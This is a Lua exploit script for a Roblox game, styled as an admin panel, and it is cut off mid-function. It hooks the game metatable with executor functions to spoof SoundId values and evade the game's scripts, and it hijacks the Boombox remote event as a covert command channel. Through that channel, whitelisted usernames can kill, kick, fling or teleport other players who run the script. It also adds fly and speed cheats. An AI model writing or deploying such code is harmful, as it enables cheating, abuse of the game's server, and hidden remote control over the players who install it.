--[[
    ═══════════════════════════════════════════════════════════════════════
     ⚡ ADMIN BY SARAN — HD Admin Style (Compact & Fixed)
     - Features: Spin, WalkSpeed, JumpPower, Fly, Rainbow Tag, Remote Cmd
     - UI: Compact Floating Window, Chat Commands, Console
    ═══════════════════════════════════════════════════════════════════════
]]

local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui        = game:GetService("StarterGui")

local LP = Players.LocalPlayer

local gethui = gethui or function() return game:GetService("CoreGui") end
local GuiParent = (function() local ok, r = pcall(gethui); return ok and r or LP:WaitForChild("PlayerGui") end)()

for _, n in ipairs({"GHOST_CMD_Root"}) do
    local o = GuiParent:FindFirstChild(n); if o then o:Destroy() end
end

------------------------------------------------------------------
-- CONFIG
------------------------------------------------------------------
local CFG = {
    ADMIN_NAME = "LOLASSR5",
    ADMIN_WL   = { ["LOLASSR5"] = true, ["SARAN"] = true }, 
    CARRIER_ID = "1848354536",
    CMD_TAG    = "ghost_cmd",
    BCN_TAG    = "ghost_bcn",
    BCN_EVERY  = 15,
    SCAN_EVERY = 0.25,
}
local function isAdmin() return CFG.ADMIN_WL[LP.Name] == true end

------------------------------------------------------------------
-- REMOTES
------------------------------------------------------------------
local function findToolEvent()
    local folder = ReplicatedStorage:FindFirstChild("RE") or ReplicatedStorage:FindFirstChild("RemoteEvents")
    if not folder then
        for _, v in ipairs(ReplicatedStorage:GetChildren()) do
            if v:IsA("Folder") and v:FindFirstChild("PlayerToolEvent") then folder = v; break end
        end
    end
    return folder and folder:FindFirstChild("PlayerToolEvent")
end
local ToolEvent = findToolEvent()
if not ToolEvent then
    task.spawn(function()
        for _ = 1, 20 do
            task.wait(0.5)
            ToolEvent = findToolEvent()
            if ToolEvent then break end
        end
    end)
end

------------------------------------------------------------------
-- CARRIER
------------------------------------------------------------------
local function equipBoombox()
    local bp = LP:FindFirstChild("Backpack")
    local char = LP.Character
    if not bp or not char then return nil end
    local tool = char:FindFirstChild("Boombox") or bp:FindFirstChild("Boombox")
    if not tool then
        for _, n in ipairs({"Super Boombox","BoomBox","Radio"}) do
            tool = char:FindFirstChild(n) or bp:FindFirstChild(n)
            if tool then break end
        end
    end
    if tool and tool.Parent == bp then pcall(function() tool.Parent = char end) end
    return tool
end

local function sendPayload(payload)
    if not ToolEvent then return false end
    local tool = equipBoombox()
    if not tool then return false end
    task.wait(0.08)
    pcall(function() ToolEvent:FireServer("ToolMusicText", payload, nil, true) end)
    task.delay(0.8, function()
        local bp = LP:FindFirstChild("Backpack")
        local char = LP.Character
        if bp and char and tool and tool.Parent == char then
            pcall(function() tool.Parent = bp end)
        end
    end)
    return true
end

local function sendCmd(action, target, param)
    if not isAdmin() then return false end
    local nonce = tostring(math.floor(os.clock() * 1000) % 1000000)
    param = tostring(param or "")
    local payload = CFG.CARRIER_ID .. "&" .. CFG.CMD_TAG .. "=" .. action .. ":" .. target:lower() .. ":" .. param .. ":" .. nonce
    return sendPayload(payload)
end

local function sendBeacon()
    local nonce = tostring(math.floor(os.clock() * 1000) % 100000)
    local safeDisp = tostring(LP.DisplayName):gsub("[&:=%%]", "")
    local payload = CFG.CARRIER_ID .. "&" .. CFG.BCN_TAG .. "=" .. LP.Name .. ":" .. safeDisp .. ":" .. nonce
    sendPayload(payload)
end

------------------------------------------------------------------
-- HOOK & MOVEMENT
------------------------------------------------------------------
local oldIndex
if getrawmetatable then
    local mt = getrawmetatable(game)
    oldIndex = mt.__index
    setreadonly(mt, false)
    mt.__index = newcclosure(function(self, key)
        if key == "SoundId" and not checkcaller() then
            local ok, name = pcall(function() return self.Name end)
            if ok and (name == "PlayersChoice" or name:find("กันเจาะ")) then
                return "rbxassetid://120232514292241"
            end
        end
        return oldIndex(self, key)
    end)
    setreadonly(mt, true)
elseif hookmetamethod and checkcaller then
    oldIndex = hookmetamethod(game, "__index", newcclosure(function(self, key)
        if key == "SoundId" and not checkcaller() then
            local ok, name = pcall(function() return self.Name end)
            if ok and (name == "PlayersChoice" or name:find("กันเจาะ")) then
                return "rbxassetid://120232514292241"
            end
        end
        return oldIndex(self, key)
    end))
end

local function rawSid(snd)
    if oldIndex then
        local ok, v = pcall(function() return oldIndex(snd, "SoundId") end)
        if ok then return v end
    end
    return snd.SoundId
end

local Move = {
    SpinOn = false,   SpinSpeed = 25,
    FlyOn  = false,   FlySpeed  = 60,
    WalkSpeed = 16,   JumpPower = 50,
}
local spinConn, flyConn, flyBV, flyBG

local function setSpin(on, speed)
    Move.SpinOn = on
    if speed then Move.SpinSpeed = speed end
    if spinConn then pcall(function() spinConn:Disconnect() end); spinConn = nil end
    if on then
        spinConn = RunService.RenderStepped:Connect(function(dt)
            local char = LP.Character
            local hrp = char and char:FindFirstChild("HumanoidRootPart")
            if hrp and Move.SpinOn then
                local rad = math.rad(Move.SpinSpeed * 360 * dt)
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, rad, 0)
            end
        end)
    end
end

local function setFly(on, speed)
    Move.FlyOn = on
    if speed then Move.FlySpeed = speed end
    if flyConn then pcall(function() flyConn:Disconnect() end); flyConn = nil end
    if flyBV then pcall(function() flyBV:Destroy() end); flyBV = nil end
    if flyBG then pcall(function() flyBG:Destroy() end); flyBG = nil end
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.PlatformStand = false end
    if not on then return end

    local cam = workspace.CurrentCamera
    flyConn = RunService.RenderStepped:Connect(function()
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or not cam or not Move.FlyOn then return end

        if not flyBV or flyBV.Parent ~= hrp then
            if flyBV then flyBV:Destroy() end
            flyBV = Instance.new("BodyVelocity")
            flyBV.MaxForce = Vector3.new(1e9, 1e9, 1e9)
            flyBV.Velocity = Vector3.zero
            flyBV.Parent = hrp
        end
        if not flyBG or flyBG.Parent ~= hrp then
            if flyBG then flyBG:Destroy() end
            flyBG = Instance.new("BodyGyro")
            flyBG.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
            flyBG.P = 9e4
            flyBG.CFrame = cam.CFrame
            flyBG.Parent = hrp
        end

        hum.PlatformStand = true
        flyBG.CFrame = cam.CFrame

        local dir = Vector3.zero
        if not UserInputService:GetFocusedTextBox() then
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0,1,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0,1,0) end
        end
        if dir.Magnitude == 0 and hum.MoveDirection.Magnitude > 0 then
            dir = (cam.CFrame.LookVector * -hum.MoveDirection.Z) + (cam.CFrame.RightVector * hum.MoveDirection.X)
        end
        flyBV.Velocity = dir.Magnitude > 0 and (dir.Unit * Move.FlySpeed) or Vector3.zero
    end)
end

local function setWalkSpeed(v)
    Move.WalkSpeed = v
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.WalkSpeed = v end
end

local function setJumpPower(v)
    Move.JumpPower = v
    local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum then hum.UseJumpPower = true; hum.JumpPower = v end
end

local function resetMove()
    setSpin(false); setFly(false); setWalkSpeed(16); setJumpPower(50)
end

------------------------------------------------------------------
-- EXECUTOR
------------------------------------------------------------------
local function executeCmd(action, target, param, sender)
    if not CFG.ADMIN_WL[sender] then return end
    local t = target:lower()
    local me = LP.Name:lower()
    local myDisp = LP.DisplayName:lower()
    if t ~= "all" and t ~= me and t ~= myDisp then return end

    local char = LP.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")

    if action == "KILL" then
        if hum then pcall(function() hum.Health = 0 end) end
    elseif action == "KICK" then
        pcall(function() LP:Kick("Removed by Admin") end)
    elseif action == "FREEZE" then
        if hum and hrp then pcall(function() hum.WalkSpeed=0; hum.JumpPower=0; hrp.Anchored=true end) end
    elseif action == "UNFREEZE" then
        if hum and hrp then pcall(function() hum.WalkSpeed=16; hum.JumpPower=50; hrp.Anchored=false end) end
    elseif action == "FLING" then
        if hrp then pcall(function() hrp.AssemblyLinearVelocity = Vector3.new(1000,1000,1000) end) end
    elseif action == "VOID" then
        if hrp then pcall(function() hrp.CFrame = CFrame.new(hrp.Position.X, -500, hrp.Position.Z) end) end
    elseif action == "SKY" then
        if hrp then pcall(function() hrp.CFrame = hrp.CFrame + Vector3.new(0, 1000, 0) end) end
    elseif action == "BRING" then
        local adm = Players:FindFirstChild(sender)
        if adm and adm.Character and adm.Character:FindFirstChild("HumanoidRootPart") and hrp then
            pcall(function() hrp.CFrame = adm.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,3) end)
        end
    elseif action == "UNLOAD" then
        pcall(function() if GuiParent:FindFirstChild("GHOST_CMD_Root") then GuiParent.GHOST_CMD_Root:Destroy() end end)
    elseif action == "SPIN" then
        setSpin(true, tonumber(param) or 25)
    elseif action == "UNSPIN" then
        setSpin(false)
    elseif action == "SPEED" then
        setWalkSpeed(tonumber(param) or 100)
    elseif action == "JUMP" then
        setJumpPower(tonumber(param) or 200)
    elseif action == "FLY" then
        setFly(true, tonumber(param) or 60)
    elseif action == "UNFLY" then
        setFly(false)
    elseif action == "RESET" then
        resetMove()
    end
end

------------------------------------------------------------------
-- SCANNER & BEACON
------------------------------------------------------------------
local Detected = {}
task.spawn(function()
    while true do
        task.wait(CFG.SCAN_EVERY)
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Character then
                for _, d in ipairs(p.Character:GetDescendants()) do
                    if d:IsA("Sound") and (d.Name == "PlayersChoice" or d.Name:find("กันเจาะ")) then
                        local sid = rawSid(d)
                        if type(sid) == "string" and sid ~= "" then
                            local a, t, prm = sid:match(CFG.CMD_TAG .. "=([A-Z_]+):([%w_%.]+):([%d%.]*):")
                            if a and t then executeCmd(a, t, prm, p.Name) end
                            local un, disp = sid:match(CFG.BCN_TAG .. "=([%w_%.]+):([%w_%.]+):")
                            if un and un ~= LP.Name then
                                Detected[un] = { display = disp or un, lastSeen = os.clock() }
                            end
                        end
                    end
                end
            end
        end
        for k, v in pairs(Detected) do
            if os.clock() - v.lastSeen > 60 then Detected[k] = nil end
        end
    end
end)

------------------------------------------------------------------
-- 🌈 RAINBOW TAG
------------------------------------------------------------------
local RainbowTagData = nil
local function findAdminPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if CFG.ADMIN_WL[p.Name] then return p end
    end
    return nil
end

local function buildRainbowTag()
    if RainbowTagData and RainbowTagData.bb and RainbowTagData.bb.Parent then RainbowTagData.bb:Destroy() end
    RainbowTagData = nil

    local adm = findAdminPlayer()
    if not adm then return end
    local char = adm.Character
    local head = char and char:FindFirstChild("Head")
    if not head then return end

    local bb = Instance.new("BillboardGui")
    bb.Name = "GHOST_AdminTag"
    bb.Size = UDim2.fromOffset(240, 64)
    bb.StudsOffset = Vector3.new(0, 3.2, 0)
    bb.AlwaysOnTop = true
    bb.MaxDistance = 1000
    bb.LightInfluence = 0
    bb.Parent = head

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(6, 6, 12)
    frame.BackgroundTransparency = 0.2
    frame.BorderSizePixel = 0
    frame.Parent = bb
    Instance.new("UICorner", frame).CornerRadius = UDim.new(1, 0)

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255,255,255)
    stroke.Thickness = 2.2
    stroke.Transparency = 0.1
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = frame

    local lbl1 = Instance.new("TextLabel")
    lbl1.Size = UDim2.new(1, -16, 0, 22)
    lbl1.Position = UDim2.new(0, 8, 0, 6)
    lbl1.BackgroundTransparency = 1
    lbl1.Text = "เจ้าของคำสายรุ้ง"
    lbl1.Font = Enum.Font.GothamBlack
    lbl1.TextSize = 16
    lbl1.TextStrokeTransparency = 0.3
    lbl1.TextStrokeColor3 = Color3.new(0, 0, 0)
    lbl1.Parent = frame

    local lbl2 = Instance.new("TextLabel")
    lbl2.Size = UDim2.new(1, -16, 0, 16)
    lbl2.Position = UDim2.new(0, 8, 0, 30)
    lbl2.BackgroundTransparency = 1
    lbl2.Text = "รันเองค้าบ"
    lbl2.Font = Enum.Font.GothamBold
    lbl2.TextSize = 13
    lbl2.TextStrokeTransparency = 0.4
    lbl2.TextStrokeColor3 = Color3.new(0, 0, 0)
    lbl2.Parent = frame

    local tGrad1 = Instance.new("UIGradient"); tGrad1.Parent = lbl1
    local tGrad2 = Instance.new("UIGradient"); tGrad2.Parent = lbl2
    local sGrad = Instance.new("UIGradient"); sGrad.Parent = stroke

    RainbowTagData = { bb = bb, tGrad1 = tGrad1, tGrad2 = tGrad2, sGrad = sGrad }
end

RunService.Heartbeat:Connect(function()
    if not RainbowTagData or not RainbowTagData.tGrad1 or not RainbowTagData.tGrad1.Parent then return end
    local t = tick() * 0.5
    local seq = ColorSequence.new({
        ColorSequenceKeypoint.new(0.00, Color3.fromHSV(t % 1, 1, 1)),
        ColorSequenceKeypoint.new(0.25, Color3.fromHSV((t + 0.25) % 1, 1, 1)),
        ColorSequenceKeypoint.new(0.50, Color3.fromHSV((t + 0.50) % 1, 1, 1)),
        ColorSequenceKeypoint.new(0.75, Color3.fromHSV((t + 0.75) % 1, 1, 1)),
        ColorSequenceKeypoint.new(1.00, Color3.fromHSV(t % 1, 1, 1)),
    })
    RainbowTagData.tGrad1.Color = seq
    if RainbowTagData.tGrad2 then RainbowTagData.tGrad2.Color = seq end
    if RainbowTagData.sGrad then RainbowTagData.sGrad.Color = seq end
end)

task.delay(1, buildRainbowTag)
task.spawn(function()
    while true do
        task.wait(3)
        if not RainbowTagData or not RainbowTagData.bb or not RainbowTagData.bb.Parent then buildRainbowTag() end
    end
end)
LP.CharacterAdded:Connect(function() task.wait(1.5); buildRainbowTag() end)

------------------------------------------------------------------
-- UI THEME & HELPERS
------------------------------------------------------------------
local T = {
    BG      = Color3.fromRGB(10, 12, 18),
    Glass   = Color3.fromRGB(18, 22, 30),
    GlassL  = Color3.fromRGB(26, 32, 44),
    Card    = Color3.fromRGB(22, 28, 38),
    Cyan    = Color3.fromRGB(0, 229, 255),
    Magenta = Color3.fromRGB(255, 0, 170),
    Red     = Color3.fromRGB(255, 59, 48),
    Green   = Color3.fromRGB(52, 199, 89),
    Orange  = Color3.fromRGB(255, 149, 0),
    TP      = Color3.fromRGB(255, 255, 255),
    TS      = Color3.fromRGB(160, 175, 205),
    TM      = Color3.fromRGB(100, 115, 145),
}
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local function corner(p, r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 12); c.Parent=p; return c end
local function stroke(p, col, w, tr) local s=Instance.new("UIStroke"); s.Color=col or T.Cyan; s.Thickness=w or 1; s.Transparency=tr or 0.3; s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; s.Parent=p; return s end
local function tw(o, t, p) return TweenService:Create(o, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), p):Play() end

------------------------------------------------------------------
-- UI BUILD
------------------------------------------------------------------
local Root = Instance.new("ScreenGui")
Root.Name = "GHOST_CMD_Root"
Root.ResetOnSpawn = false
Root.IgnoreGuiInset = true
Root.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Root.DisplayOrder = 999
Root.Parent = GuiParent

-- ปุ่มลอย (FAB)
local FAB = Instance.new("TextButton")
FAB.Size = UDim2.fromOffset(46, 46) -- เล็กลง
FAB.Position = UDim2.new(0, 12, 0.6, 0)
FAB.BackgroundColor3 = T.Glass
FAB.Text = "⚡"
FAB.TextColor3 = T.Cyan
FAB.TextSize = 24
FAB.Font = Enum.Font.GothamBold
FAB.AutoButtonColor = false
FAB.Parent = Root
corner(FAB, 14)
stroke(FAB, T.Cyan, 1.5, 0.2)

-- หน้าต่างหลัก (กะทัดรัด)
local Win = Instance.new("Frame")
Win.Size = UDim2.new(0, 320, 0, 420) -- ขนาดพอดีมือถือ
Win.Position = UDim2.new(0.5, -160, 0.5, -210)
Win.BackgroundColor3 = T.Glass
Win.BackgroundTransparency = 0.05
Win.BorderSizePixel = 0
Win.Active = true
Win.Visible = false
Win.Parent = Root
corner(Win, 16)
stroke(Win, T.Cyan, 1.2, 0.3)

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 44)
Header.BackgroundColor3 = T.GlassL
Header.BackgroundTransparency = 0.2
Header.BorderSizePixel = 0
Header.Parent = Win
corner(Header, 16)

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -80, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "ADMIN BY SARAN"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.TextColor3 = T.TP
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.fromOffset(28, 28)
CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
CloseBtn.BackgroundColor3 = T.Red
CloseBtn.BackgroundTransparency = 0.8
CloseBtn.Text = "×"
CloseBtn.TextColor3 = T.Red
CloseBtn.TextSize = 18
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.AutoButtonColor = false
CloseBtn.Parent = Header
corner(CloseBtn, 8)

-- Tabs (แท็บเล็กลง)
local TabsBar = Instance.new("Frame")
TabsBar.Size = UDim2.new(1, -16, 0, 38)
TabsBar.Position = UDim2.new(0, 8, 0, 48)
TabsBar.BackgroundColor3 = T.Card
TabsBar.BackgroundTransparency = 0.4
TabsBar.BorderSizePixel = 0
TabsBar.Parent = Win
corner(TabsBar, 10)

local TabLayout = Instance.new("UIListLayout")
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.SortOrder = Enum.SortOrder.LayoutOrder
TabLayout.Parent = TabsBar

local ActiveTab = "players"
local TabButtons = {}
local function makeTab(id, label, order)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.25, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = label
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 11
    btn.TextColor3 = T.TM
    btn.AutoButtonColor = false
    btn.LayoutOrder = order
    btn.Parent = TabsBar
    corner(btn, 8)
    TabButtons[id] = { btn = btn }
    return btn
end
makeTab("players", "Players", 1)
makeTab("actions", "Actions", 2)
makeTab("move",    "Move",    3)
makeTab("console", "Console", 4)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -16, 1, -138)
Content.Position = UDim2.new(0, 8, 0, 92)
Content.BackgroundTransparency = 1
Content.Parent = Win

------------------------------------------------------------------
-- TAB 1: PLAYERS (แก้บั๊กซ้ำแล้ว)
------------------------------------------------------------------
local PlayersPage = Instance.new("ScrollingFrame")
PlayersPage.Size = UDim2.new(1, 0, 1, 0)
PlayersPage.BackgroundTransparency = 1
PlayersPage.BorderSizePixel = 0
PlayersPage.ScrollBarThickness = 2
PlayersPage.AutomaticCanvasSize = Enum.AutomaticSize.Y
PlayersPage.Visible = true
PlayersPage.Parent = Content

local PlLayout = Instance.new("UIListLayout")
PlLayout.Padding = UDim.new(0, 6)
PlLayout.Parent = PlayersPage

local SelectedPlayer = nil
local PlayerRows = {}

local function rebuildPlayers()
    -- ล้างของเก่าทั้งหมด (Frame และ TextLabel)
    for _, c in ipairs(PlayersPage:GetChildren()) do
        if c:IsA("Frame") or c:IsA("TextLabel") or c:IsA("TextButton") then c:Destroy() end
    end
    PlayerRows = {}

    local list = {}
    for uname, data in pairs(Detected) do
        table.insert(list, { name = uname, display = data.display, lastSeen = data.lastSeen })
    end
    table.sort(list, function(a, b) return a.lastSeen > b.lastSeen end)

    if #list == 0 then
        local empty = Instance.new("TextLabel")
        empty.Size = UDim2.new(1, 0, 0, 80)
        empty.BackgroundTransparency = 1
        empty.Text = "🔍 No script users detected yet\n(Wait for beacon broadcast...)"
        empty.TextColor3 = T.TM
        empty.Font = Enum.Font.GothamMedium
        empty.TextSize = 11
        empty.TextWrapped = true
        empty.Parent = PlayersPage
        return
    end

    for i, entry in ipairs(list) do
        local row = Instance.new("TextButton")
        row.Size = UDim2.new(1, -4, 0, 48)
        row.BackgroundColor3 = T.Card
        row.BackgroundTransparency = 0.15
        row.Text = ""
        row.AutoButtonColor = false
        row.LayoutOrder = i
        row.Parent = PlayersPage
        corner(row, 10)
        stroke(row, T.Cyan, 1, 0.6)

        local nameLbl = Instance.new("TextLabel")
        nameLbl.Size = UDim2.new(1, -12, 0, 16)
        nameLbl.Position = UDim2.new(0, 8, 0, 8)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = entry.display
        nameLbl.Font = Enum.Font.GothamBold
        nameLbl.TextSize = 12
        nameLbl.TextColor3 = T.TP
        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
        nameLbl.Parent = row

        local subLbl = Instance.new("TextLabel")
        subLbl.Size = UDim2.new(1, -12, 0, 12)
        subLbl.Position = UDim2.new(0, 8, 0, 26)
        subLbl.BackgroundTransparency = 1
        local secAgo = math.floor(os.clock() - entry.lastSeen)
        subLbl.Text = "@" .. entry.name .. " · " .. (secAgo < 10 and "just now" or (secAgo .. "s ago"))
        subLbl.Font = Enum.Font.GothamMedium
        subLbl.TextSize = 10
        subLbl.TextColor3 = T.TS
        subLbl.TextXAlignment = Enum.TextXAlignment.Left
        subLbl.Parent = row

        row.MouseButton1Click:Connect(function()
            SelectedPlayer = entry.name
            updateTargetBar()
            for _, r in pairs(PlayerRows) do
                r.BackgroundTransparency = 0.15
            end
            row.BackgroundTransparency = 0
        end)

        table.insert(PlayerRows, row)
    end
end

------------------------------------------------------------------
-- TAB 2: ACTIONS
------------------------------------------------------------------
local ActionsPage = Instance.new("ScrollingFrame")
ActionsPage.Size = UDim2.new(1, 0, 1, 0)
ActionsPage.BackgroundTransparency = 1
ActionsPage.BorderSizePixel = 0
ActionsPage.ScrollBarThickness = 2
ActionsPage.AutomaticCanvasSize = Enum.AutomaticSize.Y
ActionsPage.Visible = false
ActionsPage.Parent = Content

local ActLayout = Instance.new("UIGridLayout")
ActLayout.CellSize = UDim2.new(0.33, -4, 0, 54)
ActLayout.CellPadding = UDim2.new(0, 6, 0, 6)
ActLayout.Parent = ActionsPage

local ACTIONS = {
    { id = "KILL",     icon = "💀", label = "Kill" },
    { id = "FREEZE",   icon = "❄️", label = "Freeze" },
    { id = "FLING",    icon = "💨", label = "Fling" },
    { id = "BRING",    icon = "🪄", label = "Bring" },
    { id = "VOID",     icon = "🕳️", label = "Void" },
    { id = "SKY",      icon = "☁️", label = "Sky" },
    { id = "SPIN",     icon = "🔄", label = "Spin", param = "25" },
    { id = "FLY",      icon = "🦅", label = "Fly", param = "60" },
    { id = "UNFREEZE", icon = "🔥", label = "Unfreeze" },
    { id = "KICK",     icon = "🔨", label = "Kick" },
    { id = "UNLOAD",   icon = "🗑️", label = "Unload" },
    { id = "RESET",    icon = "♻️", label = "Reset" },
}

for i, act in ipairs(ACTIONS) do
    local btn = Instance.new("TextButton")
    btn.BackgroundColor3 = T.Card
    btn.BackgroundTransparency = 0.15
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.LayoutOrder = i
    btn.Parent = ActionsPage
    corner(btn, 10)
    stroke(btn, T.Cyan, 0.8, 0.6)

    local ico = Instance.new("TextLabel")
    ico.Size = UDim2.new(1, 0, 0, 24)
    ico.Position = UDim2.new(0, 0, 0, 4)
    ico.BackgroundTransparency = 1
    ico.Text = act.icon
    ico.TextSize = 18
    ico.Parent = btn

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, 0, 0, 12)
    lbl.Position = UDim2.new(0, 0, 1, -18)
    lbl.BackgroundTransparency = 1
    lbl.Text = act.label
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 9.5
    lbl.TextColor3 = T.TP
    lbl.Parent = btn

    btn.MouseButton1Click:Connect(function()
        if not isAdmin() or not SelectedPlayer then return end
        sendCmd(act.id, SelectedPlayer, act.param)
        btn.BackgroundColor3 = T.Cyan
        task.delay(0.2, function() tw(btn, 0.2, {BackgroundColor3 = T.Card}) end)
    end)
end

------------------------------------------------------------------
-- TAB 3: MOVE (ย่อขนาดลง)
------------------------------------------------------------------
local MovePage = Instance.new("ScrollingFrame")
MovePage.Size = UDim2.new(1, 0, 1, 0)
MovePage.BackgroundTransparency = 1
MovePage.BorderSizePixel = 0
MovePage.ScrollBarThickness = 2
MovePage.AutomaticCanvasSize = Enum.AutomaticSize.Y
MovePage.Visible = false
MovePage.Parent = Content

local MoveLayout = Instance.new("UIListLayout")
MoveLayout.Padding = UDim.new(0, 6)
MoveLayout.Parent = MovePage

local function makeRow(parent, order)
    local r = Instance.new("Frame")
    r.Size = UDim2.new(1, 0, 0, 36)
    r.BackgroundColor3 = T.Card
    r.BackgroundTransparency = 0.2
    r.LayoutOrder = order
    r.Parent = parent
    corner(r, 8)
    return r
end

-- Spin Row
local r1 = makeRow(MovePage, 1)
local r1lbl = Instance.new("TextLabel"); r1lbl.Size=UDim2.new(0.5,0,1,0); r1lbl.Position=UDim2.new(0,10,0,0); r1lbl.BackgroundTransparency=1; r1lbl.Text="🔄 Spin Speed"; r1lbl.TextColor3=T.TP; r1lbl.TextSize=11; r1lbl.Font=Enum.Font.GothamBold; r1lbl.TextXAlignment=Enum.TextXAlignment.Left; r1lbl.Parent=r1
local spinVal = Instance.new("TextLabel"); spinVal.Size=UDim2.new(0.5,-10,1,0); spinVal.Position=UDim2.new(0.5,0,0,0); spinVal.BackgroundTransparency=1; spinVal.Text="25"; spinVal.TextColor3=T.Cyan; spinVal.TextSize=12; spinVal.Font=Enum.Font.GothamBold; spinVal.TextXAlignment=Enum.TextXAlignment.Right; spinVal.Parent=r1

local r2 = makeRow(MovePage, 2)
local r2lbl = Instance.new("TextLabel"); r2lbl.Size=UDim2.new(0.5,0,1,0); r2lbl.Position=UDim2.new(0,10,0,0); r2lbl.BackgroundTransparency=1; r2lbl.Text="🦅 Fly Speed"; r2lbl.TextColor3=T.TP; r2lbl.TextSize=11; r2lbl.Font=Enum.Font.GothamBold; r2lbl.TextXAlignment=Enum.TextXAlignment.Left; r2lbl.Parent=r2
local flyVal = Instance.new("TextLabel"); flyVal.Size=UDim2.new(0.5,-10,1,0); flyVal.Position=UDim2.new(0.5,0,0,0); flyVal.BackgroundTransparency=1; flyVal.Text="60"; flyVal.TextColor3=T.Cyan; flyVal.TextSize=12; flyVal.Font=Enum.Font.GothamBold; flyVal.TextXAlignment=Enum.TextXAlignment.Right; flyVal.Parent=r2

local r3 = makeRow(MovePage, 3)
local r3lbl = Instance.new("TextLabel"); r3lbl.Size=UDim2.new(0.5,0,1,0); r3lbl.Position=UDim2.new(0,10,0,0); r3lbl.BackgroundTransparency=1; r3lbl.Text="🏃 Walk Speed"; r3lbl.TextColor3=T.TP; r3lbl.TextSize=11; r3lbl.Font=Enum.Font.GothamBold; r3lbl.TextXAlignment=Enum.TextXAlignment.Left; r3lbl.Parent=r3
local walkVal = Instance.new("TextLabel"); walkVal.Size=UDim2.new(0.5,-10,1,0); walkVal.Position=UDim2.new(0.5,0,0,0); walkVal.BackgroundTransparency=1; walkVal.Text="16"; walkVal.TextColor3=T.Cyan; walkVal.TextSize=12; walkVal.Font=Enum.Font.GothamBold; walkVal.TextXAlignment=Enum.TextXAlignment.Right; walkVal.Parent=r3

local r4 = makeRow(MovePage, 4)
local r4lbl = Instance.new("TextLabel"); r4lbl.Size=UDim2.new(0.5,0,1,0); r4lbl.Position=UDim2.new(0,10,0,0); r4lbl.BackgroundTransparency=1; r4lbl.Text="🦘 Jump Power"; r4lbl.TextColor3=T.TP; r4lbl.TextSize=11; r4lbl.Font=Enum.Font.GothamBold; r4lbl.TextXAlignment=Enum.TextXAlignment.Left; r4lbl.Parent=r4
local jumpVal = Instance.new("TextLabel"); jumpVal.Size=UDim2.new(0.5,-10,1,0); jumpVal.Position=UDim2.new(0.5,0,0,0); jumpVal.BackgroundTransparency=1; jumpVal.Text="50"; jumpVal.TextColor3=T.Cyan; jumpVal.TextSize=12; jumpVal.Font=Enum.Font.GothamBold; jumpVal.TextXAlignment=Enum.TextXAlignment.Right; jumpVal.Parent=r4

-- จัดการพิมพ์ตัวเลขเอง
local function bindInput(row, labelObj, defaultVal, callback)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = row
    btn.MouseButton1Click:Connect(function()
        local box = Instance.new("TextBox")
        box.Size = UDim2.new(1, -20, 0, 30)
        box.Position = UDim2.new(0, 10, 0.5, -15)
        box.BackgroundColor3 = T.BG
        box.Text = labelObj.Text
        box.TextColor3 = T.TP
        box.Font = Enum.Font.GothamBold
        box.TextSize = 14
        box.ZIndex = 10
        box.Parent = row
        corner(box, 6)
        box:CaptureFocus()
        
        box.FocusLost:Connect(function()
            local num = tonumber(box.Text)
            if num then
                labelObj.Text = tostring(num)
                callback(num)
            end
